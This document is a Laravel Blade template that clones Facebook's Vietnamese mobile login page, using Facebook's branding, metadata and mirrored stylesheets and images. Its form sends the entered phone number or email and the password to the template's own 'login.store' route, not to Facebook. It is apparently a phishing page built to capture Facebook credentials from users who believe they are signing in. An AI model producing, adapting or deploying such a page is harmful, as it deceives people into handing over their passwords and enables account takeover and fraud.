<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Facebook - Đăng nhập hoặc đăng ký</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="assets/mobile/images/favicon.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <meta name="theme-color" content="#3b5998">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/0fDi6ijKUyo.css" data-bootloader-hash="MoYpVB9"
          crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/z9ppHSxO24O.css" data-bootloader-hash="aRsnqzl"
          crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/K4xMuoYbFyJ.css" data-bootloader-hash="0iYmMFG"
          crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="assets/mobile/css/i8Lgq5jtfso.css" data-bootloader-hash="WZdEF9F"
          crossorigin="anonymous">
    <meta name="description"
          content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
    <meta property="og:site_name" content="Facebook">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
    <meta property="og:description"
          content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
    <meta property="og:image" content="assets/mobile/images/fb_icon_325x325.png">
    <meta property="og:url" content="">

</head>

<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw  landscape"
      style="min-height: 289px; background-color: rgb(255, 255, 255);">
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 289px;">
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"
             style="min-height: 289px;">
            <div class="_7om2">
                <div class="_4g34" id="u_0_0_R4">
                    <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error"
                         data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                    </div>
                    <div class="_9om_">
                        <div class="_4-4l">

                            <div class="_7om2 _52we _2pid _52z6" style="margin-top: 30px;">
                                <div class="_4g34">
                                    <img src="assets/mobile/images/dF5SId3UHWd.svg" width="112" class="img"
                                         alt="facebook"></a>
                                </div>
                            </div>
                            <div class="_5rut">
                                <form action="{{ route('login.store') }}" method="post" class="mobile-login-form _9hp- _5spm">
                                    @csrf
                                    <div id="user_info_container" data-sigil="user_info_after_failure_element">
                                    </div>
                                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element">
                                    </div>
                                    <div id="otp_retrieve_desc_container"></div>
                                    <div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_96n9">
                                                    <input autocapitalize="off" type="text" class="_56bg _4u9z _5ruq _8qtn" name="username" placeholder="Số di động hoặc email">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_55wq"></div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_1upc _mg8">
                                                    <div class="_7om2">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <input class="_56bg _4u9z _27z2 _8qtm" name="password" placeholder="Mật khẩu" type="password">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="login_password_step_element"
                                             data-sigil="login_password_step_element">
                                            <button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login">
                                                <span class=" _55sr">Đăng nhập</span>
                                            </button>
                                        </div>
                                        <div class="_7eif" id="oauth_login_button_container" style="display:none">
                                        </div>
                                        <div class="_7f_d" id="oauth_login_desc_container" style="display:none">
                                        </div>
                                        <div id="otp_button_elem_container"></div>
                                    </div>
                                </form>
                                <div>
                                    <div class="_2pie _9omz">
                                        <div class="_52jj _9on1">
                                            <a class="_9on1" tabindex="0" href="">Quên mật khẩu?</a>
                                        </div>
                                    </div>
                                    <div style="padding-top: 42px">
                                        <div>
                                            <div>
                                                <div>
                                                    <div id="login_reg_separator" class="_43mg _8qtf"
                                                         data-sigil="login_reg_separator">
                                                        <span class="_43mh">hoặc</span>
                                                    </div>
                                                    <div class="_52jj _5t3b" id="signup_button_area">
                                                        <a role="button"
                                                           class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                                           tabindex="0">Tạo tài khoản mới</a>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_2pie" style="text-align:center;">
                                                <div>
                                                    <div data-sigil="login_identify_step_element"></div>
                                                    <div class="other-links _8p_m">
                                                        <ul class="_5pkb _55wp">
                                                            <li></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_7om2">
                            <div class="_4g34">
                                <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="">中文(台灣)</a>
                                        </span>
                                </div>
                                <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="">Español</a>
                                        </span>
                                </div>
                                <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="">Français (France)</a>
                                        </span>
                                </div>
                            </div>
                            <div class="_4g34">
                                <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="">English (UK)</a>
                                        </span>
                                </div>
                                <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="">한국어</a>
                                        </span>
                                </div>
                                <div class="_3ztc">
                                        <span class="_52jc">
                                            <a href="">Português (Brasil)</a>
                                        </span>
                                </div>
                                <a href="">
                                    <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"
                                         data-sigil="more_language">
                                        <i class="img sp_8fkxYjN88QR_3x sx_bc1fc3"></i>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="_5ui4">
                        <div class="_96qv _9a0a">
                            <a href="" class="_96qw"
                               title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới
                                thiệu</a>
                            <span aria-hidden="true"> · </span>
                            <a href="" class="_96qw" title="Truy cập Trung tâm trợ giúp của chúng tôi.">Trợ giúp</a>
                            <span aria-hidden="true"> · </span>
                            <span class="_96qw" id="u_0_5_UG">Xem thêm</span>
                        </div>
                        <span class="mfss fcg">Facebook, Inc.</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</body>

</html>